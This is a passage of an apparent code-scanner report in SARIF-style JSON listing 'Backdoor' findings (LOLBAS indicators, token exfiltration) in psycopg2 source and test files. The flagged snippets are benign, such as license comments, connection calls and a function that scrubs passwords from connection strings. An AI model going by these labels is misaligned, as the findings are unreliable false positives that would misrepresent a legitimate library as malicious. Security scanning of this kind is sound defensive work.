                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_types_basic.py"
                },
                "region": {
                  "startLine": 369,
                  "startColumn": 11,
                  "endLine": 369,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        from enum import IntEnum\n\n        class Color(IntEnum):\n            RED = 1\n            GREEN = 2\n            BLUE = 4\n\n",
                    "rendered": {
                      "text": "        from enum import IntEnum\n\n        class Color(IntEnum):\n            RED = 1\n            GREEN = 2\n            BLUE = 4\n\n",
                      "markdown": "`        from enum import IntEnum\n\n        class Color(IntEnum):\n            RED = 1\n            GREEN = 2\n            BLUE = 4\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_types_basic.py"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 47,
                  "endLine": 147,
                  "endColumn": 53,
                  "snippet": {
                    "text": "        curs = self.conn.cursor()\n        curs.execute(\n            \"create table array_test \"\n            \"(id integer, col timestamp without time zone[])\")\n\n        curs.execute(\"insert into array_test values (%s, %s)\",\n            (1, [datetime.date(2011, 2, 14)]))\n",
                    "rendered": {
                      "text": "        curs = self.conn.cursor()\n        curs.execute(\n            \"create table array_test \"\n            \"(id integer, col timestamp without time zone[])\")\n\n        curs.execute(\"insert into array_test values (%s, %s)\",\n            (1, [datetime.date(2011, 2, 14)]))\n",
                      "markdown": "`        curs = self.conn.cursor()\n        curs.execute(\n            \"create table array_test \"\n            \"(id integer, col timestamp without time zone[])\")\n\n        curs.execute(\"insert into array_test values (%s, %s)\",\n            (1, [datetime.date(2011, 2, 14)]))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_types_basic.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_types_basic.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/dbapi20.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 1,
                  "endLine": 31,
                  "endColumn": 9,
                  "snippet": {
                    "text": "# Updates for py3k\n#\n# Revision 1.11  2005/01/02 02:41:01  zenzen\n# Update author email address\n#\n# Revision 1.10  2003/10/09 03:14:14  zenzen\n# Add test for DB API 2.0 optional extension, where database exceptions\n",
                    "rendered": {
                      "text": "# Updates for py3k\n#\n# Revision 1.11  2005/01/02 02:41:01  zenzen\n# Update author email address\n#\n# Revision 1.10  2003/10/09 03:14:14  zenzen\n# Add test for DB API 2.0 optional extension, where database exceptions\n",
                      "markdown": "`# Updates for py3k\n#\n# Revision 1.11  2005/01/02 02:41:01  zenzen\n# Update author email address\n#\n# Revision 1.10  2003/10/09 03:14:14  zenzen\n# Add test for DB API 2.0 optional extension, where database exceptions\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/dbapi20.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 6,
                  "endLine": 20,
                  "snippet": {
                    "text": "__author__ = 'Stuart Bishop <stuart@stuartbishop.net>'\n\nimport unittest\nimport time\nimport sys\n\n\n# Revision 1.12  2009/02/06 03:35:11  kf7xm\n",
                    "rendered": {
                      "text": "__author__ = 'Stuart Bishop <stuart@stuartbishop.net>'\n\nimport unittest\nimport time\nimport sys\n\n\n# Revision 1.12  2009/02/06 03:35:11  kf7xm\n",
                      "markdown": "`__author__ = 'Stuart Bishop <stuart@stuartbishop.net>'\n\nimport unittest\nimport time\nimport sys\n\n\n# Revision 1.12  2009/02/06 03:35:11  kf7xm\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/dbapi20.py"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 1,
                  "endLine": 8,
                  "endColumn": 7,
                  "snippet": {
                    "text": "\n \"Now we have booze and barflies entering the discussion, plus rumours of\n  DBAs on drugs... and I won't tell you what flashes through my mind each\n  time I read the subject line with 'Anal Compliance' in it.  All around\n  this is turning out to be a thoroughly unwholesome unit test.\"\n\n    -- Ian Bicking\n",
                    "rendered": {
                      "text": "\n \"Now we have booze and barflies entering the discussion, plus rumours of\n  DBAs on drugs... and I won't tell you what flashes through my mind each\n  time I read the subject line with 'Anal Compliance' in it.  All around\n  this is turning out to be a thoroughly unwholesome unit test.\"\n\n    -- Ian Bicking\n",
                      "markdown": "`\n \"Now we have booze and barflies entering the discussion, plus rumours of\n  DBAs on drugs... and I won't tell you what flashes through my mind each\n  time I read the subject line with 'Anal Compliance' in it.  All around\n  this is turning out to be a thoroughly unwholesome unit test.\"\n\n    -- Ian Bicking\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/utils.h"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 43,
                  "endLine": 50,
                  "endColumn": 51,
                  "snippet": {
                    "text": "HIDDEN int psyco_is_text_file(PyObject *f);\n\nHIDDEN PyObject *psyco_dict_from_conninfo_options(\n    PQconninfoOption *options, int include_password);\n\nHIDDEN PyObject *psyco_make_dsn(PyObject *dsn, PyObject *kwargs);\n\n",
                    "rendered": {
                      "text": "HIDDEN int psyco_is_text_file(PyObject *f);\n\nHIDDEN PyObject *psyco_dict_from_conninfo_options(\n    PQconninfoOption *options, int include_password);\n\nHIDDEN PyObject *psyco_make_dsn(PyObject *dsn, PyObject *kwargs);\n\n",
                      "markdown": "`HIDDEN int psyco_is_text_file(PyObject *f);\n\nHIDDEN PyObject *psyco_dict_from_conninfo_options(\n    PQconninfoOption *options, int include_password);\n\nHIDDEN PyObject *psyco_make_dsn(PyObject *dsn, PyObject *kwargs);\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_int.c"
                },
                "region": {
                  "startLine": 774,
                  "startColumn": 52,
                  "endLine": 774,
                  "endColumn": 56,
                  "snippet": {
                    "text": "\n    self->pgconn = pgconn = PQconnectStart(dsn);\n\n    Dprintf(\"conn_connect: new postgresql connection at %p\", pgconn);\n\n    if (pgconn == NULL)\n    {\n",
                    "rendered": {
                      "text": "\n    self->pgconn = pgconn = PQconnectStart(dsn);\n\n    Dprintf(\"conn_connect: new postgresql connection at %p\", pgconn);\n\n    if (pgconn == NULL)\n    {\n",
                      "markdown": "`\n    self->pgconn = pgconn = PQconnectStart(dsn);\n\n    Dprintf(\"conn_connect: new postgresql connection at %p\", pgconn);\n\n    if (pgconn == NULL)\n    {\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_int.c"
                },
                "region": {
                  "startLine": 727,
                  "startColumn": 54,
                  "endLine": 727,
                  "endColumn": 58,
                  "snippet": {
                    "text": "        Py_BEGIN_ALLOW_THREADS;\n        self->pgconn = PQconnectStart(dsn);\n        Py_END_ALLOW_THREADS;\n        Dprintf(\"conn_connect: new green PG connection at %p\", self->pgconn);\n    }\n\n    if (!self->pgconn)\n",
                    "rendered": {
                      "text": "        Py_BEGIN_ALLOW_THREADS;\n        self->pgconn = PQconnectStart(dsn);\n        Py_END_ALLOW_THREADS;\n        Dprintf(\"conn_connect: new green PG connection at %p\", self->pgconn);\n    }\n\n    if (!self->pgconn)\n",
                      "markdown": "`        Py_BEGIN_ALLOW_THREADS;\n        self->pgconn = PQconnectStart(dsn);\n        Py_END_ALLOW_THREADS;\n        Dprintf(\"conn_connect: new green PG connection at %p\", self->pgconn);\n    }\n\n    if (!self->pgconn)\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_int.c"
                },
                "region": {
                  "startLine": 721,
                  "startColumn": 48,
                  "endLine": 721,
                  "endColumn": 52,
                  "snippet": {
                    "text": "        Py_BEGIN_ALLOW_THREADS;\n        self->pgconn = PQconnectdb(dsn);\n        Py_END_ALLOW_THREADS;\n        Dprintf(\"conn_connect: new PG connection at %p\", self->pgconn);\n    }\n    else {\n        Py_BEGIN_ALLOW_THREADS;\n",
                    "rendered": {
                      "text": "        Py_BEGIN_ALLOW_THREADS;\n        self->pgconn = PQconnectdb(dsn);\n        Py_END_ALLOW_THREADS;\n        Dprintf(\"conn_connect: new PG connection at %p\", self->pgconn);\n    }\n    else {\n        Py_BEGIN_ALLOW_THREADS;\n",
                      "markdown": "`        Py_BEGIN_ALLOW_THREADS;\n        self->pgconn = PQconnectdb(dsn);\n        Py_END_ALLOW_THREADS;\n        Dprintf(\"conn_connect: new PG connection at %p\", self->pgconn);\n    }\n    else {\n        Py_BEGIN_ALLOW_THREADS;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_int.c"
                },
                "region": {
                  "startLine": 727,
                  "startColumn": 40,
                  "endLine": 727,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        Py_BEGIN_ALLOW_THREADS;\n        self->pgconn = PQconnectStart(dsn);\n        Py_END_ALLOW_THREADS;\n        Dprintf(\"conn_connect: new green PG connection at %p\", self->pgconn);\n    }\n\n    if (!self->pgconn)\n",
                    "rendered": {
                      "text": "        Py_BEGIN_ALLOW_THREADS;\n        self->pgconn = PQconnectStart(dsn);\n        Py_END_ALLOW_THREADS;\n        Dprintf(\"conn_connect: new green PG connection at %p\", self->pgconn);\n    }\n\n    if (!self->pgconn)\n",
                      "markdown": "`        Py_BEGIN_ALLOW_THREADS;\n        self->pgconn = PQconnectStart(dsn);\n        Py_END_ALLOW_THREADS;\n        Dprintf(\"conn_connect: new green PG connection at %p\", self->pgconn);\n    }\n\n    if (!self->pgconn)\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_int.c"
                },
                "region": {
                  "startLine": 721,
                  "startColumn": 34,
                  "endLine": 721,
                  "endColumn": 38,
                  "snippet": {
                    "text": "        Py_BEGIN_ALLOW_THREADS;\n        self->pgconn = PQconnectdb(dsn);\n        Py_END_ALLOW_THREADS;\n        Dprintf(\"conn_connect: new PG connection at %p\", self->pgconn);\n    }\n    else {\n        Py_BEGIN_ALLOW_THREADS;\n",
                    "rendered": {
                      "text": "        Py_BEGIN_ALLOW_THREADS;\n        self->pgconn = PQconnectdb(dsn);\n        Py_END_ALLOW_THREADS;\n        Dprintf(\"conn_connect: new PG connection at %p\", self->pgconn);\n    }\n    else {\n        Py_BEGIN_ALLOW_THREADS;\n",
                      "markdown": "`        Py_BEGIN_ALLOW_THREADS;\n        self->pgconn = PQconnectdb(dsn);\n        Py_END_ALLOW_THREADS;\n        Dprintf(\"conn_connect: new PG connection at %p\", self->pgconn);\n    }\n    else {\n        Py_BEGIN_ALLOW_THREADS;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_int.c"
                },
                "region": {
                  "startLine": 1203,
                  "startColumn": 45,
                  "endLine": 1203,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    if (!(pydsn = psyco_make_dsn(Py_None, d))) { goto exit; }\n    if (!(pydsn = psyco_ensure_bytes(pydsn))) { goto exit; }\n\n    /* Return the connection string with the password replaced */\n    psyco_strdup(&rv, Bytes_AS_STRING(pydsn), -1);\n\nexit:\n",
                    "rendered": {
                      "text": "    if (!(pydsn = psyco_make_dsn(Py_None, d))) { goto exit; }\n    if (!(pydsn = psyco_ensure_bytes(pydsn))) { goto exit; }\n\n    /* Return the connection string with the password replaced */\n    psyco_strdup(&rv, Bytes_AS_STRING(pydsn), -1);\n\nexit:\n",
                      "markdown": "`    if (!(pydsn = psyco_make_dsn(Py_None, d))) { goto exit; }\n    if (!(pydsn = psyco_ensure_bytes(pydsn))) { goto exit; }\n\n    /* Return the connection string with the password replaced */\n    psyco_strdup(&rv, Bytes_AS_STRING(pydsn), -1);\n\nexit:\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_int.c"
                },
                "region": {
                  "startLine": 1199,
                  "startColumn": 37,
                  "endLine": 1199,
                  "endColumn": 45,
                  "snippet": {
                    "text": "\n    /* scrub the password and put back the connection string together */\n    if (!(v = Text_FromUTF8(\"xxx\"))) { goto exit; }\n    if (0 > PyDict_SetItemString(d, \"password\", v)) { goto exit; }\n    if (!(pydsn = psyco_make_dsn(Py_None, d))) { goto exit; }\n    if (!(pydsn = psyco_ensure_bytes(pydsn))) { goto exit; }\n\n",
                    "rendered": {
                      "text": "\n    /* scrub the password and put back the connection string together */\n    if (!(v = Text_FromUTF8(\"xxx\"))) { goto exit; }\n    if (0 > PyDict_SetItemString(d, \"password\", v)) { goto exit; }\n    if (!(pydsn = psyco_make_dsn(Py_None, d))) { goto exit; }\n    if (!(pydsn = psyco_ensure_bytes(pydsn))) { goto exit; }\n\n",
                      "markdown": "`\n    /* scrub the password and put back the connection string together */\n    if (!(v = Text_FromUTF8(\"xxx\"))) { goto exit; }\n    if (0 > PyDict_SetItemString(d, \"password\", v)) { goto exit; }\n    if (!(pydsn = psyco_make_dsn(Py_None, d))) { goto exit; }\n    if (!(pydsn = psyco_ensure_bytes(pydsn))) { goto exit; }\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_int.c"
                },
                "region": {
                  "startLine": 1197,
                  "startColumn": 17,
                  "endLine": 1197,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        goto exit;\n    }\n\n    /* scrub the password and put back the connection string together */\n    if (!(v = Text_FromUTF8(\"xxx\"))) { goto exit; }\n    if (0 > PyDict_SetItemString(d, \"password\", v)) { goto exit; }\n    if (!(pydsn = psyco_make_dsn(Py_None, d))) { goto exit; }\n",
                    "rendered": {
                      "text": "        goto exit;\n    }\n\n    /* scrub the password and put back the connection string together */\n    if (!(v = Text_FromUTF8(\"xxx\"))) { goto exit; }\n    if (0 > PyDict_SetItemString(d, \"password\", v)) { goto exit; }\n    if (!(pydsn = psyco_make_dsn(Py_None, d))) { goto exit; }\n",
                      "markdown": "`        goto exit;\n    }\n\n    /* scrub the password and put back the connection string together */\n    if (!(v = Text_FromUTF8(\"xxx\"))) { goto exit; }\n    if (0 > PyDict_SetItemString(d, \"password\", v)) { goto exit; }\n    if (!(pydsn = psyco_make_dsn(Py_None, d))) { goto exit; }\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_int.c"
                },
                "region": {
                  "startLine": 1192,
                  "startColumn": 34,
                  "endLine": 1192,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        goto exit;\n    }\n    if (NULL == PyDict_GetItemString(d, \"password\")) {\n        /* the dsn doesn't have a password */\n        psyco_strdup(&rv, dsn, -1);\n        goto exit;\n    }\n",
                    "rendered": {
                      "text": "        goto exit;\n    }\n    if (NULL == PyDict_GetItemString(d, \"password\")) {\n        /* the dsn doesn't have a password */\n        psyco_strdup(&rv, dsn, -1);\n        goto exit;\n    }\n",
                      "markdown": "`        goto exit;\n    }\n    if (NULL == PyDict_GetItemString(d, \"password\")) {\n        /* the dsn doesn't have a password */\n        psyco_strdup(&rv, dsn, -1);\n        goto exit;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_int.c"
                },
                "region": {
                  "startLine": 1191,
                  "startColumn": 41,
                  "endLine": 1191,
                  "endColumn": 49,
                  "snippet": {
                    "text": "            options, /* include_password = */ 1))) {\n        goto exit;\n    }\n    if (NULL == PyDict_GetItemString(d, \"password\")) {\n        /* the dsn doesn't have a password */\n        psyco_strdup(&rv, dsn, -1);\n        goto exit;\n",
                    "rendered": {
                      "text": "            options, /* include_password = */ 1))) {\n        goto exit;\n    }\n    if (NULL == PyDict_GetItemString(d, \"password\")) {\n        /* the dsn doesn't have a password */\n        psyco_strdup(&rv, dsn, -1);\n        goto exit;\n",
                      "markdown": "`            options, /* include_password = */ 1))) {\n        goto exit;\n    }\n    if (NULL == PyDict_GetItemString(d, \"password\")) {\n        /* the dsn doesn't have a password */\n        psyco_strdup(&rv, dsn, -1);\n        goto exit;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_int.c"
                },
                "region": {
                  "startLine": 1188,
                  "startColumn": 32,
                  "endLine": 1188,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    }\n\n    if (!(d = psyco_dict_from_conninfo_options(\n            options, /* include_password = */ 1))) {\n        goto exit;\n    }\n    if (NULL == PyDict_GetItemString(d, \"password\")) {\n",
                    "rendered": {
                      "text": "    }\n\n    if (!(d = psyco_dict_from_conninfo_options(\n            options, /* include_password = */ 1))) {\n        goto exit;\n    }\n    if (NULL == PyDict_GetItemString(d, \"password\")) {\n",
                      "markdown": "`    }\n\n    if (!(d = psyco_dict_from_conninfo_options(\n            options, /* include_password = */ 1))) {\n        goto exit;\n    }\n    if (NULL == PyDict_GetItemString(d, \"password\")) {\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_int.c"
                },
                "region": {
                  "startLine": 1170,
                  "startColumn": 13,
                  "endLine": 1170,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * In case of error return NULL and raise an exception.\n */\nchar *\nconn_obscure_password(const char *dsn)\n{\n    PQconninfoOption *options = NULL;\n    PyObject *d = NULL, *v = NULL, *pydsn = NULL;\n",
                    "rendered": {
                      "text": " * In case of error return NULL and raise an exception.\n */\nchar *\nconn_obscure_password(const char *dsn)\n{\n    PQconninfoOption *options = NULL;\n    PyObject *d = NULL, *v = NULL, *pydsn = NULL;\n",
                      "markdown": "` * In case of error return NULL and raise an exception.\n */\nchar *\nconn_obscure_password(const char *dsn)\n{\n    PQconninfoOption *options = NULL;\n    PyObject *d = NULL, *v = NULL, *pydsn = NULL;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/connection_int.c"
                },
                "region": {
                  "startLine": 1163,
                  "startColumn": 46,
                  "endLine": 1163,
                  "endColumn": 54,
                  "snippet": {
                    "text": "}\n\n\n/* Return a copy of the 'dsn' string with the password scrubbed.\n *\n * The string returned is allocated on the Python heap.\n *\n",
                    "rendered": {
                      "text": "}\n\n\n/* Return a copy of the 'dsn' string with the password scrubbed.\n *\n * The string returned is allocated on the Python heap.\n *\n",
                      "markdown": "`}\n\n\n/* Return a copy of the 'dsn' string with the password scrubbed.\n *\n * The string returned is allocated on the Python heap.\n *\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_replication.py"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 6,
                  "endLine": 27,
                  "snippet": {
                    "text": "# FITNESS FOR A PARTICULAR PURPOSE.  See the GNU Lesser General Public\n# License for more details.\n\nimport time\nfrom select import select\n\nimport psycopg2\nfrom psycopg2 import sql\n",
                    "rendered": {
                      "text": "# FITNESS FOR A PARTICULAR PURPOSE.  See the GNU Lesser General Public\n# License for more details.\n\nimport time\nfrom select import select\n\nimport psycopg2\nfrom psycopg2 import sql\n",
                      "markdown": "`# FITNESS FOR A PARTICULAR PURPOSE.  See the GNU Lesser General Public\n# License for more details.\n\nimport time\nfrom select import select\n\nimport psycopg2\nfrom psycopg2 import sql\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_replication.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
